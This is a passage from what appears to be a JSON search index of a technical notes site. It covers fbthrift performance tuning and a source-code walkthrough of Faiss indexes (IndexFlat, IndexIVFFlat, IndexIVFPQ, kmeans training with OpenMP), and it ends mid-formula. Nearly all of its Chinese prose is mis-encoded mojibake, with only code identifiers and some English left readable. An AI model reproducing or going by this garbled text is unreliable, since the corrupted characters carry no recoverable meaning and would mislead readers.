èƒŒæ™¯ï¼šåœ¨æ•°æ®ç”Ÿäº§æ¶ˆè´¹çš„æ—¶å€™ï¼Œé€šå¸¸ä¸æ˜¯è¿ç»­çš„è¿‡ç¨‹ï¼Œä½†æ˜¯åœ¨å†…å­˜ä½¿ç”¨è¿‡ç¨‹ä¸­æˆ‘ä»¬å´é€šå¸¸éœ€è¦ç”³è¯·ä¸€å—è¿ç»­çš„å†…å­˜ï¼› æ€§èƒ½ï¼šfbthrift å®£ç§°è¿™ä¸€æ¦‚å¿µå¸¦æ¥äº†å¾ˆå¤§æ”¶ç›Šï¼Œå‡å°‘äº†å†…å­˜æ‹·è´ï¼ˆZero Copyï¼‰ï¼Œä¼ é€’æŒ‡é’ˆè¿›è¡Œè§£æï¼Œå¯¹éè¿ç»­å†…å­˜å‹å¥½ï¼ˆæµå¼åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼‰ï¼›  å¸¸è§é—®é¢˜ä¸ä¼˜åŒ–æ€è·¯ #  Client Fast Retry ç­–ç•¥ä¸ Server Loadingshedding ç­–ç•¥ã€‚\nä¼˜åŒ–æ€è·¯ï¼šå°‘ç”¨â€œå¼‚æ­¥â€ã€â€œBufferedâ€å®¢æˆ·ç«¯ï¼š\n  Buffered ä¸ Framed åè®®ï¼šä¸¤è€…éƒ½æ˜¯ Thrift çš„ä¼ è¾“åè®®ã€‚Framed åè®®æœ‰ä¸€ä¸ªå››å­—èŠ‚çš„é•¿åº¦æŒ‡ç¤ºæ¶ˆæ¯é•¿åº¦ï¼›Buffered åè®®åˆ™é€šè¿‡ä¸æ–­å°è¯• fid æ¥æ¢æµ‹åŒ…ä¼ è¾“çš„è¾¹ç•Œï¼Œæ¢ç´¢ç»“æŸåäº¤ç»™ worker çº¿ç¨‹è¿›è¡Œåºåˆ—åŒ–ï¼›\n  é—®é¢˜ï¼šåœ¨è¯·æ±‚å¤§åŒ…æ—¶ï¼ŒBuffered åè®®ä¼šåå¤è¿›è¡Œåºåˆ—åŒ–æ¢æµ‹ï¼ŒCPU æµªè´¹ä¸¥é‡ï¼›\n  è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨â€œåŒæ­¥ Bufferedâ€çš„å¼‚æ­¥æ¥å£ï¼›\n  ArchonOptimizedServer ä¼˜åŒ–ï¼š\n èƒŒæ™¯ä¸šåŠ¡åœºæ™¯ï¼šQPS è¾ƒé«˜ï¼Œä¸”è¯·æ±‚è¾ƒçŸ­ï¼Œæ— éœ€è¿›è¡Œ io/worker åˆ‡æ¢çš„åœºæ™¯ï¼› å¼Šç«¯ï¼šæ²¡æœ‰ post calls éœ€æ±‚ï¼Œæ²¡æœ‰å¤š accept éœ€æ±‚ï¼›  æå‰é‡Šæ”¾ workerï¼ˆå¤§çº¦å¯ä»¥æå‡ 30% çš„ååé‡ï¼‰ï¼š\n èƒŒæ™¯ä¸šåŠ¡åœºæ™¯ï¼šåœ¨ worker çš„æœ€åä¸€ä¸ªä¸šåŠ¡åœºæ™¯éœ€è¦ç­‰å¾… IO ä»»åŠ¡æ—¶ï¼Œå› ä¸º worker æŒæœ‰è¯·æ±‚çš„ socket ä¿¡æ¯å¯¼è‡´ worker ä¸€ç›´æ— æ³•é‡Šæ”¾ï¼Œä½†æ˜¯åœ¨æœ€åè¿™æ®µæ—¶é—´å†… worker å´æ²¡æœ‰åšä»»ä½•äº‹æƒ…ï¼› è§£å†³æ–¹æ¡ˆï¼šfbthrift ä¸­æä¾›äº† HandlerCallback å¯ä»¥æå‰é‡Šæ”¾ worker çš„èƒ½åŠ›ï¼Œåœ¨ worker ä»£ç ç»“æŸæ—¶ï¼Œå°†éœ€è¦è¿”å›åéœ€è¦æ‰§è¡Œçš„ä»£ç é€šè¿‡ callback ç»Ÿä¸€å­˜æ”¾åœ¨æŸä¸ªä½ç½®ï¼›å»ºè®®ä¸ batch ä¸€èµ·ä½¿ç”¨ï¼› å¼Šç«¯ï¼šæ— æ³•ç»Ÿè®¡ latency çš„ Metricsï¼Œworker çš„è¯­ä¹‰å‘ç”Ÿå˜åŒ–ï¼›  ç²¾ç»†åŒ–çº¿ç¨‹æ± çš„æ•°é‡ï¼šæ ¹æ®ä¸šåŠ¡åœºæ™¯ç²¾ç»†åŒ–åœ°é…ç½®æ¯ä¸ªçº¿ç¨‹æ± çš„æ•°é‡ï¼›\nå–„ç”¨ folly::futureï¼šå¯¹äº 10w*5 æ¬¡çš„è°ƒç”¨ï¼Œæ¯å‡å°‘ 1 ä¸ª then çš„è°ƒç”¨ï¼Œèƒ½å‡å°‘åƒåˆ†ä¹‹ä¸€çš„ CPU ä½¿ç”¨ï¼›\nä¼˜åŒ– IOã€ç²¾ç®€æ‹“æ‰‘ï¼šå…³æ³¨é•¿é“¾æ¥å’Œæ‹“æ‰‘çš„å¤æ‚åº¦ï¼›\n"},{"id":428,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/faiss/","title":"Faiss","section":"é¡¹ç›®åº•å±‚å®ç°","content":"faiss #  1. é¡¹ç›®ç›®çš„ã€æ¡†æ¶ã€æ–‡ä»¶ç»“æ„ã€æ¥å£ #  ç®€ä»‹ï¼š\n faiss å…¨ç§° Facebook AI Similarity Searchï¼› å®ƒç”¨äºå¯¹æµ·é‡é«˜ç»´æ•°æ®ï¼Œåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿›è¡Œé‚»è¿‘ç‚¹çš„è®¡ç®—ï¼› å®ƒçš„ Github å¼€æºåœ°å€ï¼šhttps://github.com/facebookresearch/faissï¼ŒDocker åœ°å€ï¼šhttps://hub.docker.com/r/plippe/faiss-docker/#!  åŸºç¡€çŸ¥è¯†å’Œæ¡†æ¶ï¼š\n å¼€å‘è¯­è¨€ï¼šC++ï¼Œå¼€æ”¾ API è¯­è¨€ï¼šC++ æˆ– Pythonï¼› C++ ä¸­å‡åŒ€åˆ†å¸ƒï¼šstd::uniform_real_distributionï¼› kmeansï¼šä¸€ç§èšç±»æ–¹æ³•ï¼Œå°† n ç»„åŒç»´åº¦çš„å‘é‡èšç±»ä¸º k ç±»ï¼› ompï¼šOpen Muti-Processï¼Œå¯æ‰©å±•ã€è·¨å¹³å°çš„å¤šçº¿ç¨‹æ¡†æ¶ï¼Œå®˜ç½‘ä½¿ç”¨ä¾‹å­ï¼šhttps://www.openmp.org/wp-content/uploads/openmp-examples-5.1.pdfã€‚omp æä¾›ç¼–è¯‘å±‚é¢çš„æŒ‡ä»¤å¼ APIï¼š  pragma å¯ä»¥æŒ‡å®šå¯¹åº”æŒ‡ä»¤ï¼š#pragma omp directive-specificationï¼› C++ å¯ä»¥ç”¨ attribute çš„æ–¹å¼æŒ‡å®šï¼š[[omp :: directive( directive-specification )]]   ç¼–è¯‘æ¡†æ¶ï¼šCMake å•å…ƒæµ‹è¯•æ¡†æ¶ï¼šgtest  æ¥å£ï¼šdemo å’Œ tutorial ä¸­è°ƒç”¨çš„éƒ½æ˜¯ faiss ä¸­ä»¥ Index å¼€å¤´çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ IndexFlat.hï¼‰ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿äº Index è¿™ä¸ªå®šä¹‰äº Index.h è¿™ä¸ªæ–‡ä»¶çš„ç±»ã€‚\nä¸€äº›è´¯ç©¿è¿™ä¸ªæ–‡ä»¶å®šä¹‰çš„æ¦‚å¿µå’Œç±»å‹å®šä¹‰ï¼š\n dï¼šå†…éƒ¨æŒ‡ç¤ºå‘é‡çº¬åº¦çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼› MetricTypeï¼šè·ç¦»è®¡ç®—æ–¹å¼ï¼ŒMETRIC_L2 æ˜¯æœ€å¸¸è§çš„æ¬§å¼è·ç¦»ï¼› idx_tï¼šç”¨äºè®¡é‡å‘é‡æ•°é‡æˆ–ä¸‹æ ‡çš„ç±»å‹ï¼Œå½“ä¸€ç»„å‘é‡ä½œä¸ºå‚æ•°ä¼ å…¥æ—¶é€šå¸¸æ˜¯ä¸€ä¸ª n * d é•¿åº¦çš„çº¿æ€§æµ®ç‚¹æ•°ï¼›  å®ƒçš„æ ¸å¿ƒæ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\n   å‡½æ•°å ä½œç”¨     train è®­ç»ƒ n ä¸ª d ç»´çš„å‘é‡ï¼Œå‘é‡ç”¨ä¸€ä¸ªé•¿åº¦ä¸º n * d çš„çº¿æ€§æ•°ç»„è¡¨ç¤º   add/add_with_ids åŠ¨æ€æ·»åŠ å‘é‡çš„ API   search/range_search/assign æ‰§è¡Œæœç´¢æ“ä½œçš„ç›¸å…³ APIï¼ŒANN é—®é¢˜çš„æ ¸å¿ƒç®—æ³•ï¼Œä¼ å…¥ä¸€ç»„å‘é‡ï¼Œæœç´¢æŒ‡å®šæ•°é‡æˆ–åŠå¾„å†…çš„å‘é‡ã€‚   reset/ remove_ids/ reconstruct/ reconstruct_n/ search_and_reconstruct é‡å»ºã€åˆ é™¤ç›¸å…³çš„ APIã€‚   compute_residual/ compute_residual_n è®¡ç®—å‰©ä½™å‘é‡ã€‚    2. é€šè¯»ä»£ç ï¼Œæ¢³ç†è°ƒç”¨é€»è¾‘ #  ä» tutorial ä¸­çš„ä»£ç å¼€å§‹ï¼Œåˆ†åˆ«æ¢³ç† cpp/ ä¸‹çš„å„ä¸ªæ–‡ä»¶è°ƒç”¨é€»è¾‘ã€‚\nFlat #  flat çš„å«ä¹‰æ˜¯æœ€æœ´ç´ çš„å®ç°ï¼šå®ƒå…¨é‡åœ°å­˜å‚¨æ‰€æœ‰çš„å‘é‡æ•°æ®ï¼Œå¹¶ä¸”æ‰§è¡Œæš´åŠ›æœç´¢ã€‚\ntutorial ä¸­æ„å»ºçš„å…·ä½“ç±»å‹æ˜¯ faiss::IndexFlatL2ï¼Œæ ¸å¿ƒè°ƒç”¨çš„ä¸¤ä¸ª API æ˜¯ add ä¸ searchï¼Œå®ƒçš„å…·ä½“å®ç°æ–‡ä»¶ä¸º faiss/IndexFlatã€‚\nä»åŸºç±» Index å¼€å§‹ï¼Œç»§æ‰¿è¡ç”Ÿå‡ºçš„\u0010ä»¥ä¸‹çš„ç±»å‹ï¼š\n IndexFlatCodes: Indexï¼šç”¨æœ€ç®€å•çš„å›ºå®šé•¿åº¦ç¼–ç å’Œæ•°ç»„å­˜å‚¨ï¼Œå®ç°äº† add ç›¸å…³çš„æ–¹æ³•ï¼› IndexFlat : IndexFlatCodesï¼šç”¨æœ€ç®€å•çš„æš´åŠ›æœç´¢å®ç°äº† search/reconstruct ç›¸å…³çš„æ–¹æ³•ï¼› IndexFlatIP: IndexFlat/IndexFlatL2 : IndexFlatï¼šåŸºäºå†…ç§¯è·ç¦»å’ŒåŸºäºæ¬§æ°è·ç¦»çš„ä¸¤ä¸ªåˆ†ç±»æ–¹æ³•ï¼› IndexFlat1D : IndexFlatL2ï¼šä¸€ç»´å‘é‡çš„ç‰¹åŒ–ä¼˜åŒ–æ–¹æ³•ï¼›  ä¹Ÿå°±æ˜¯ Flat ä¸­åŒ…å«çš„æ ¸å¿ƒé€»è¾‘æ˜¯ IndexFlatCodes ä¸­çš„ç®€å•å­˜å‚¨é€»è¾‘ï¼Œå’Œ IndexFlat ä¸­çš„ç®€å•æœç´¢é€»è¾‘ã€‚\nIndexIVFFlat #  IndexIVF å®šä¹‰çš„æ ¸å¿ƒæ–‡ä»¶æ˜¯ faiss/IndexIVF.hï¼Œåœ¨æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ° IndexIVF çš„å«ä¹‰æ˜¯ \u0026ldquo;index based on a inverted file\u0026rdquo;ï¼Œå³â€œåŸºäºå€’æ’æ–‡ä»¶çš„ç´¢å¼•â€ï¼Œä¹Ÿå°±æ˜¯å€’æ’ç´¢å¼•ï¼š\n åœ¨æ·»åŠ æ—¶ï¼Œé‡åŒ–å™¨ï¼ˆquantizerï¼‰ä¸ºè¾“å…¥å‘é‡æä¾›äº†ä¸€ä¸ªé‡åŒ–ç´¢å¼•ï¼ˆquantization indexï¼‰ï¼Œç±»çš„å®ç°ä¸­ä¼šå­˜å‚¨ç€è¿™ä¸ªç´¢å¼•åˆ°æŸä¸ªåˆ—è¡¨çš„æ˜ å°„ï¼Œè¿™ä¸ªåˆ—è¡¨å°±æ˜¯åŸå§‹å‘é‡é›†åˆï¼› åœ¨æœç´¢æ—¶ï¼Œè¢«æœç´¢å‘é‡é¦–å…ˆä¼šè¢«é‡åŒ–è®¡ç®—å‡ºä¸€ä¸ªç´¢å¼•ï¼Œç±»å®ç°ä¸­çš„æ˜ å°„åˆ—è¡¨å°±æ˜¯æœç´¢ç»“æœï¼› PostScriptï¼šé‡åŒ–ç»“æœå¯ä»¥ç”¨å¤šè·¯æœç´¢ï¼ˆmulti-probe searchï¼‰æ³›åŒ–ï¼Œä»è€Œè®¿é—®å¾—åˆ°å¤šä¸ªåˆ—è¡¨ï¼ˆnprobeï¼‰ï¼›  è¿™ä¸ªæ ¸å¿ƒæ–‡ä»¶ä¸­å®šä¹‰äº†ç»“æ„ IndexIVFï¼Œå®ƒæœ‰ Index/Level1Quantizer ä¸¤ä¸ªçˆ¶ç±»ã€‚åœ¨ tutorial ä¸­æ„å»ºçš„æ ¸å¿ƒç±»æ˜¯ IndexFlatL2/IndexIVFFlatï¼Œå‰è€…æ„å»ºåä½œä¸º quantizer ä¼ å…¥åè€…çš„æ„é€ å‡½æ•°ï¼Œè°ƒç”¨çš„æ ¸å¿ƒ API æ˜¯åè€…çš„ train/add/searchã€‚\nä¸‹é¢è®¨è®ºä¸€ä¸‹æ¶‰åŠåˆ°çš„ä¸€äº›æ ¸å¿ƒç±»ï¼š\n Level1Quantizerï¼šIndexIVF çš„çˆ¶ç±»ï¼ŒæŠ½è±¡å°è£…äº†ç‹¬ç«‹äºå­˜å‚¨çš„é€»è¾‘ã€‚æš‚æ—¶æ²¡æœ‰ç‰¹åˆ«ç†è§£è¿™ä¸ªç±»çš„ä½œç”¨ï¼› IndexIVF : Index, Lvel1Quantizerï¼šæ ¸å¿ƒç»“æ„ï¼Œæ³¨é‡Šéƒ½å†™åœ¨è¿™ä¸ªç»“æ„ä¸Šã€‚  InvertedListsï¼šInvertedLists.invlists çš„æ•°æ®ç±»å‹ï¼Œå­˜å‚¨ç€çœŸå®çš„æ•°æ®ï¼Œç»“æ„å®ç°äº†å¹¶å‘ RUï¼› DirectMapï¼šInvertedLists.direct_map çš„æ•°æ®ç»“æ„ï¼Œå¯é€‰å˜é‡ï¼Œå°† ids æ˜ å°„å›å€’æ’åˆ—è¡¨çš„æ–¹å¼ï¼› InvertedListScannerï¼šå¤„ç† IVF æœç´¢çš„å°è£…ç»“æ„ï¼Œæ ¸å¿ƒæ–¹æ³•æ˜¯ distance_to_codeã€scan_codesï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å®ç°äº†å¤šçº¿ç¨‹å®‰å…¨è°ƒç”¨ã€‚   IndexIVFStats indexIVF_statsï¼šä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨ç€ IVF æ­£åœ¨æŸ¥è¯¢çš„æ•°é‡ã€å †æ›´æ–°æ¬¡æ•°ç­‰ä¿¡æ¯ï¼› IndexIVFFlat : IndexIVFï¼šç®€å•åœ°ç”¨å‘é‡å­˜å‚¨å€’æ’æ–‡ä»¶ï¼›  IndexIVFPQ #  æ ¸å¿ƒæ–‡ä»¶æ˜¯ faiss/IndexIVFPQ.hï¼Œå…¶ä¸­çš„ PQ æŒ‡ \u0026ldquo;product quantizer\u0026rdquo;ï¼Œä¸€ç§ç¼–ç å­˜å‚¨å‘é‡çš„æ–¹å¼ã€‚\ntutorial ä¸­çš„ä½¿ç”¨ä¸â€œå¹³å‡¡å€’æ’ç´¢å¼•â€ç±»ä¼¼ï¼Œå…ˆæ„é€ äº†ä¸€ä¸ª IndexFlatL2 ä½œä¸ºé‡åŒ–å™¨ï¼Œä»¥æ­¤ä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°æ„é€  IndexIVFPQ ç±»å‹çš„å˜é‡ã€‚ä¸å‰é¢çš„ç±»ä¼¼ï¼Œè¿™ä¸ª tutorial çš„ demo ä¸­è°ƒç”¨çš„æ ¸å¿ƒ API ä»ç„¶æ˜¯ add/train/search ä¸‰ä¸ªå‡½æ•°ã€‚\næ¶‰åŠåˆ°çš„æ ¸å¿ƒç»“æ„ï¼š\n IndexIVFPQ : IndexIVFï¼šæ ¸å¿ƒç»“æ„ï¼Œå‘é‡ç”¨ PQ çš„æ–¹å¼å­˜å‚¨ã€‚  ProductQuantizerï¼šIndexIVFPQ.pq çš„ç±»å‹ï¼Œå°è£…äº† PQ ç¼–ç çš„å®ç°ï¼› AlignedTableï¼šIndexIVFPQ.precomputed_table çš„ç±»å‹ï¼›   ndexIVFPQStats indexIVFPQ_statsï¼šä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨ä¸€äº›å·¥ç¨‹ç»Ÿè®¡æ•°æ®ï¼›  GPU/Multiple-GPUs #  GPU ç›¸å…³çš„å®ç°ä¸ CPU çš„ api å®šä¹‰ä¸è°ƒç”¨æµç¨‹çœ‹èµ·æ¥æ˜¯ç±»ä¼¼çš„ï¼Œåœ¨ API ä¸Šé¢å¤–å®ç°äº† \u0026ldquo;copy from IndexFlat\u0026rdquo;/\u0026ldquo;copy to IndexFlat\u0026rdquo; ç­‰å‡½æ•°ã€‚\næ€»ç»“ #  faiss é€šè¿‡å®ç°ä¸åŒçš„ç±»ç»“æ„è§£è€¦ä¸åŒçš„é€»è¾‘ï¼Œä»¥ Index ä¸ºæ ¹ç»“ç‚¹å¯¹ä¸åŒçš„æ–°å¢é€»è¾‘æ´¾ç”Ÿäº†ä¸åŒçš„å­ç±»ï¼Œè‡ªé¡¶å‘ä¸‹å¤§è‡´åˆ†ä¸ºâ€œæœç´¢æ–¹å¼â€ã€â€œå­˜å‚¨æ–¹å¼â€ã€â€œè®¡ç®—ç¡¬ä»¶â€ä¸‰ä¸ªåˆ†æ”¯ï¼š\n â€œæœç´¢æ–¹å¼â€æŒ‡çš„æ˜¯æµ·é‡å‘é‡ä¸­æœç´¢å¯¹åº”ä¸´è¿‘å¯¹çš„é€»è¾‘ï¼Œå®ƒæ˜¯ ANN é—®é¢˜çš„æ ¸å¿ƒé€»è¾‘ï¼Œfaiss ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯\u0026quot;index based on a inverted file\u0026quot;ï¼›å°±æ˜¯ Index ç»“æ„ä¸­ä¸‰ä¸ªæ ¸å¿ƒæ–¹æ³•çš„å…·ä½“å®ç° add/search/trainï¼› â€œå­˜å‚¨æ–¹å¼â€æŒ‡çš„æ˜¯å‘é‡ä»¥ä»€ä¹ˆæ–¹å¼å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œfaiss ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯å«åš\u0026quot;product quantizer\u0026quot;çš„ç¼–ç æ–¹å¼ï¼› â€œè®¡ç®—ç¡¬ä»¶â€æŒ‡çš„æ˜¯è®¡ç®—å•å…ƒä½¿ç”¨ CPU æˆ– GPU è¿›è¡Œè®¡ç®—ï¼Œè¿™å—é€»è¾‘æˆ‘ä¸å¤ªå…³å¿ƒï¼› PostScriptï¼šå…¶ä»–å…¬å…±çš„å‡½æ•°é€»è¾‘ä¸ç»“æ„å°è£…ï¼Œæ¯”å¦‚ InvertedListsï¼›  3. æ·±å…¥äº†è§£é¡¹ç›®æ ¸å¿ƒé€»è¾‘ #  æœ´ç´ åŸºç±» Index #  å‡ ä¹æ‰€æœ‰çš„å°è£…ç»“æ„çš„å…¬å…±ç¥–å…ˆï¼Œçœ‹ä¸‹å®ƒçš„æœ´ç´ å®ç° IndexFlat/IndexFlatCodes åŠŸèƒ½ä¸å…·ä½“å®ç°ã€‚\nIndex::trainï¼šæ²¡æœ‰å®ç°ï¼Œdo nothingï¼›\nIndexFlatCodes::addï¼šresize å‘é‡ codec çš„å¤§å°ï¼Œå¹¶è°ƒç”¨ sa_encode æ–¹æ³•å¯¹æ–°çš„ä½ç½®è¿›è¡Œèµ‹å€¼ï¼›\nIndexFlat::sa_encodeï¼šæœ´ç´ åœ°ç›´æ¥å°†å¯¹åº”å‘é‡æ‹·è´åˆ°ç›®æ ‡å†…å­˜ä¸­ï¼›\nIndexFlat::searchï¼šè¾“å…¥ n ä¸ªå‘é‡ï¼Œåœ¨å·²ç»å­˜å‚¨åœ¨ Index çš„æ•°æ®åº“ä¸­ä¸º n ä¸ªå‘é‡åˆ†åˆ«éƒ½æ‰¾åˆ°æ‰¾åˆ° k ä¸ªä¸´è¿‘å‘é‡ï¼Œé€šè¿‡ metric_type åˆ†æµè°ƒç”¨æš´åŠ›æœç´¢ï¼›\næ€»ç»“ï¼š\n  Index ä½œä¸ºåŸºç±»å¯ä»¥è§†ä½œä¸ºä¸€ä¸ªæä¾›äº†é»˜è®¤å®ç°çš„çˆ¶ç±»ï¼›\n  Index ä½œä¸ºå˜é‡æˆ–è€…å‚æ•°å¯ä»¥è§†ä½œä¸ºä¸€ä¸ªå†…å­˜çº§åˆ«çš„ç´¢å¼•æ•°æ®åº“ï¼Œæˆ–è€…ä¸€ä¸ªâ€œæ­£æ’â€ï¼›\n  Index è¿˜å¯ä»¥è§†ä½œä»…æ‰¿è½½ç¼–ç æ–¹æ³•çš„çº¯å‡½æ•°å°è£…ç±»ï¼Œæ­¤æ—¶çš„æ ¸å¿ƒæ–¹æ³•æ˜¯ sa_encode ä¸ sa_decodeï¼›\n  æœç´¢æ–¹æ³• IVF #  ä»¥ 2-IVFFlat.cpp ä¸­çš„ tutorial è°ƒç”¨ä¸ºä¾‹ï¼Œå‘é‡ç»´åº¦ d ä¸º 64ã€æ•°æ®åº“å¤§å° nb 100000ã€‚\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒå…ˆæ„é€ äº† faiss::IndexFlatL2 quantizerï¼Œç„¶åæ„é€ äº† fails::IndexIVFFlat indexï¼Œéšåå…ˆåè°ƒç”¨äº†æ–¹æ³• trainã€addã€searchã€‚\nIndexIVF::train\n æ ¸å¿ƒè°ƒç”¨ Level1Quantizer::train_q1ï¼Œå†…éƒ¨é€šè¿‡ quantizer_trains_alone åˆ†æµï¼Œå®šä¹‰å¤„æœ‰ç›¸å…³çš„æ³¨é‡Šï¼Œæ„Ÿè§‰ä¸å¤ªçœ‹å¾—æ‡‚ï¼Œæˆ‘é€‰æ‹©ç›´æ¥çœ‹å®ƒä»¬çš„å®ç°ï¼š  quantizer_trains_alone = 0ï¼šæ„é€ äº† Cluster åè°ƒç”¨å®ƒçš„ train æ–¹æ³•ï¼ŒCluster æ˜¯ kmeans å®ç°çš„ç»“æ„å°è£…ï¼Œæ ¸å¿ƒæ–¹æ³• trainï¼Œè¾“å…¥ä¸€ä¸ªå¾…è®­ç»ƒçš„å‘é‡æ•°ç»„å’Œä¸€ä¸ªç´¢å¼•ï¼ˆæš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ„æ€ï¼‰ï¼Œè¿”å›è‹¥å¹²ä¸ªè´¨å¿ƒç‚¹ï¼› quantizer_trains_alone = 1ï¼šåªç›´æ¥è°ƒç”¨ quantizer-\u0026gt;trainï¼› quantizer_trains_alone = 2ï¼šä¸ =0 æ—¶ç±»ä¼¼ï¼Œæœ‰ä¸åŒçš„ä¼ å…¥å’Œè°ƒç”¨é€»è¾‘ï¼Œæš‚æ—¶æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼›   ç»¼ä¸Š Cluster::train æ˜¯ä¸€ä¸ªæ ¸å¿ƒæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åˆè½¬å‘é€»è¾‘åˆ°äº† train_encodedã€‚  å‚æ•°ä¸å¸¸ç”¨å˜é‡è§£é‡Šï¼š  æˆå‘˜å˜é‡ dï¼šå‘é‡ç»´åº¦ï¼› æˆå‘˜å˜é‡ kï¼šè´¨å¿ƒçš„æ•°é‡ï¼› æˆå‘˜å˜é‡ centoridsï¼šè´¨å¿ƒå‘é‡ï¼Œä»¥ k * d ä¸€ç»´æ•°ç»„è¡¨ç¤ºï¼Œæ ¸å¿ƒè¾“å‡ºç»“æœï¼› æˆå‘˜å˜é‡ iteration_statsï¼šä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ kmeans æ–¹æ³•ä¸­æŸæ¬¡è¿­ä»£çš„çŠ¶æ€è®°å½•ï¼› å‚æ•° nxï¼šå‘é‡çš„æ•°é‡ï¼› å‚æ•° x_inï¼šå‘é‡çš„å€¼ï¼Œä»¥ä¸€ä¸ª nx * d ä¸€ç»´æ•°ç»„å½¢å¼ä¼ å…¥ï¼Œè¡¨ç¤ºä¸€ä¸ªçŸ©é˜µï¼› å‚æ•° codecï¼šè¾“å…¥å‘é‡æ•°æ®çš„ç¼–ç æ–¹å¼ï¼ŒIndex ç±»æ‰¿è½½å‰ä¸€èŠ‚â€œæ€»ç»“3â€çš„åŠŸèƒ½ï¼› å‚æ•° indexï¼šâ€œè´¨å¿ƒâ€åˆ°â€œé“¾è¡¨â€çš„å€’æ’ç´¢å¼•ï¼ŒIndex ç±»æ‰¿è½½å‰ä¸€èŠ‚â€œæ€»ç»“2â€çš„åŠŸèƒ½ï¼› å‚æ•° weightsï¼šç”¨äºè®¡ç®—è´¨å¿ƒçš„æƒé‡æ•°ç»„ï¼Œé•¿åº¦ nxï¼›   è¿è¡Œæµç¨‹ï¼šå‚æ•°åˆæ³•æ€§æ ¡éªŒã€å¯¹ nx è¿‡å¤§æ—¶è¿›è¡Œé‡‡æ ·ã€å¤„ç†è¾¹ç•Œæƒ…å†µã€æ‰“å°æ—¥å¿—ã€å¾ªç¯è¿­ä»£ï¼› nredo æ¬¡å¾ªç¯é€»è¾‘æ˜¯ç®—æ³•çš„æ ¸å¿ƒæµç¨‹ï¼š  ä» x[0:k] ä¸­å– k ä¸ªè´¨å¿ƒï¼Œåšéšæœºæ’åˆ—å¹¶è§£ç åèµ‹å€¼ç»™ centroids ï¼› è°ƒç”¨å€’æ’ç´¢å¼• index çš„ train æ–¹æ³•ä¸ add æ–¹æ³•ï¼Œæ­¤æ—¶è¯¥ç´¢å¼•å­˜å‚¨äº† k ä¸ªè´¨å¿ƒå¹¶èƒ½æ‰§è¡Œå¿«é€Ÿæœç´¢ï¼› æ‰§è¡Œ niter æ¬¡è¿­ä»£ï¼Œkmeans æ–¹æ³•çš„æ ¸å¿ƒæµç¨‹ï¼š  åœ¨è´¨å¿ƒç´¢å¼• index ä¸­ï¼Œä¸º nx ä¸ªå‘é‡ä¸­æ¯ä¸€ä¸ªéƒ½æœç´¢ä¸€ä¸ªæœ€è¿‘çš„å‘é‡ï¼Œè¿”å›ç»“æœåœ¨å±€éƒ¨å˜é‡ assign ä¸­ã€è·ç¦»åœ¨ dis ä¸­ï¼›åŠ å’Œæ‰€æœ‰ dis ä½œä¸ºåˆ†ç±»è¡¡é‡æŒ‡æ ‡ï¼› è°ƒç”¨è®¡ç®—è´¨å¿ƒæ–¹æ³• compute_centroidsï¼Œè°ƒç”¨å¤„ç†ç©ºåˆ†ç±»æ–¹æ³• split_clustersï¼Œè®°å½•å½“å‰è¿­ä»£çŠ¶æ€ iteration_statsï¼› å°†æœ¬æ¬¡è¿­ä»£è®¡ç®—å¾—åˆ°çš„ k ä¸ªè´¨å¿ƒå­˜å…¥ç´¢å¼• indexï¼›   å¦‚æœæœ¬æ¬¡å¾ªç¯å¾—åˆ°çš„è´¨å¿ƒæ›´å¥½ï¼Œåˆ™è®°å½•ä¸º best_centroidsï¼›   ç»“æŸå¾ªç¯åå°† best_centroids è®¾ç½®åˆ°è´¨å¿ƒç´¢å¼• index ä¸­ï¼Œå¹¶è¿”å›å‡½æ•°ï¼›   ä¸Šé¢çš„ kmeans è¿­ä»£ä¸­å¼•ç”¨äº†ä¸€ä¸ªæ ¸å¿ƒæ–¹æ³• compute_centroidsï¼Œå®ƒçš„å®ç°ï¼š  #pragma omp parallel æ–°èµ·äº†è‹¥å¹²ä¸ªçº¿ç¨‹å¼‚æ­¥å¤„ç†è¿™æ®µé€»è¾‘ï¼ˆçº¿ç¨‹æ•°é‡åœ¨å…¶ä»–ä½ç½®æŒ‡å®šï¼‰ï¼š  å¯¹äº â€œå½“å‰çº¿ç¨‹å·/æ€»çº¿ç¨‹æ•°é‡â€œ=â€r/ntâ€œï¼Œå½“å‰çº¿ç¨‹å°†å¤„ç† k * r / nt åˆ° k * (r + 1) / nt è¿™äº›è´¨å¿ƒçš„è®¡ç®—é€»è¾‘ï¼› å…·ä½“çš„å¾ªç¯ä½“é€»è¾‘ï¼Œå³å¯¹äºæ¯ä¸€ä¸ªè¾“å…¥çš„ç‚¹ xï¼Œå¯¹å®ƒå…ˆè§£ç è€Œåæ‰§è¡Œç´¯åŠ é€»è¾‘ï¼›æ€»ç»“ä¸‹æ¥è¿™æ®µå¤šçº¿ç¨‹ä»£ç çš„æ‰§è¡Œæ•ˆæœæ˜¯ï¼š$$\\displaystyle \\vec{c}k = \\sum{assign[i] = k}^{}{\\vec{x_{i}} * w_i}, hassign_k = \\sum_{assign[i] = k}{w_i}$$   #pragma omp parallel for ç”¨å¤šçº¿ç¨‹çš„æ–¹å¼å¤„ç†ä¸‹é¢è¿™æ®µ for å¾ªç¯é€»è¾‘ï¼š  å¯¹äºæ¯ä¸ªè´¨å¿ƒï¼Œåº”ç”¨ä¼ å…¥çš„ hassign è¿›è¡Œæ­£è§„åŒ–ï¼Œå³ $$\\displaystyle \\vec{c}_{norm} = 